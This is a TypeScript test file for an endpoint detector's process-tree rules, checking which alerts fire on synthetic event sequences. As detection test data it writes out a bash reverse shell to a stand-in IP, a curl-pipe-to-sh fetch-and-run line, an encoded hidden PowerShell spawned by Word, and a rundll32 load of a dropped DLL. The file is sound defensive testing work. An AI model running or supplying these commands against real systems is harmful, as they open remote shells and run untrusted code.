import { describe, expect, it } from 'vitest'
import type { ApiEvent } from './api'
import { buildProcessModel, severity } from './process-tree'

let serial = 0

function event(type: string, timestamp: number, data: Record<string, unknown>): ApiEvent {
  serial += 1
  return { id: `f${serial}`, agent_id: 'a1', event_type: type, timestamp, data: JSON.stringify(data), received_at: timestamp }
}

const run = (timestamp: number, pid: number, ppid: number, path: string, args: string[] = []) =>
  event('process', timestamp, { action: 'Create', pid, ppid, executable_path: path, command_line: [path, ...args], uid: 1000 })
const connect = (timestamp: number, pid: number) =>
  event('network', timestamp, { action: 'Connect', pid, protocol: 'tcp', dest_ip: '203.0.113.9', dest_port: 443, bytes_sent: 1, bytes_received: 1 })
const write = (timestamp: number, pid: number, path: string) => event('file', timestamp, { action: 'Write', pid, path })

function rulesFor(events: ApiEvent[], pid: number): string[] {
  const model = buildProcessModel(events)
  return model.all.find((proc) => proc.pid === pid)!.findings.map((finding) => finding.rule)
}

const SYSTEM = 'C:\\Windows\\System32\\'
const POWERSHELL = `${SYSTEM}WindowsPowerShell\\v1.0\\powershell.exe`

describe('detection rules', () => {
  it('reads a macro dropper end to end', () => {
    const events = [
      run(1, 10, 0, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'),
      run(2, 11, 10, POWERSHELL, ['-nop', '-w', 'hidden', '-enc', 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA']),
      connect(3, 11),
      write(4, 11, 'C:\\Users\\Public\\update.dll'),
      run(5, 12, 11, `${SYSTEM}rundll32.exe`, ['C:\\Users\\Public\\update.dll,Start']),
      connect(6, 12),
    ]
    expect(rulesFor(events, 11)).toEqual(['office-child', 'encoded-command', 'drops-executable', 'hidden-window', 'shell-network'])
    expect(rulesFor(events, 12)).toEqual(['proxy-network', 'proxy-loads-writable'])
    expect(rulesFor(events, 10)).toEqual([])
  })

  it('reads a web shell and a reverse shell on Linux', () => {
    const events = [
      run(1, 20, 0, '/usr/sbin/nginx'),
      run(2, 21, 20, '/bin/sh', ['-c', 'id']),
      run(3, 22, 21, '/bin/bash', ['-c', 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1']),
      run(4, 23, 0, '/bin/sh', ['-c', 'curl -s http://203.0.113.9/a | sh']),
      run(5, 24, 0, '/tmp/.x/kworker'),
    ]
    expect(rulesFor(events, 21)).toEqual(['server-child'])
    expect(rulesFor(events, 22)).toEqual(['reverse-shell'])
    expect(rulesFor(events, 23)).toEqual(['fetch-and-run'])
    expect(rulesFor(events, 24)).toEqual(['writable-image'])
  })

  it('stays quiet on ordinary developer and server work', () => {
    const events = [
      run(1, 30, 0, 'C:\\BuildAgent\\bin\\buildagent.exe'),
      run(2, 31, 30, `${SYSTEM}cmd.exe`, ['/c', 'npm', 'ci']),
      run(3, 32, 31, 'C:\\Program Files\\nodejs\\node.exe', ['install.js']),
      connect(4, 32),
      run(5, 33, 0, 'C:\\Python312\\python.exe', ['worker.py']),
      connect(6, 33),
      run(7, 34, 0, 'C:\\Program Files\\PowerShell\\7\\pwsh.exe'),
      run(8, 35, 0, `${SYSTEM}rundll32.exe`, [`${SYSTEM}shell32.dll,Control_RunDLL`]),
      run(9, 36, 0, '/usr/bin/curl', ['-o', '/tmp/report.csv', 'https://example.com/report.csv']),
    ]
    const model = buildProcessModel(events)
    expect(model.all.flatMap((proc) => proc.findings)).toEqual([])
    expect(model.all.map((proc) => severity(proc))).toEqual(['plain', 'plain', 'link', 'link', 'plain', 'plain', 'plain'])
  })

  it('rates a shell that only talks to the network as worth a look, not as an alert', () => {
    const events = [run(1, 40, 0, '/bin/bash', ['deploy.sh']), connect(2, 40)]
    const model = buildProcessModel(events)
    expect(model.all[0]!.findings.map((finding) => [finding.rule, finding.level])).toEqual([['shell-network', 'medium']])
    expect(severity(model.all[0]!)).toBe('warn')
  })
})
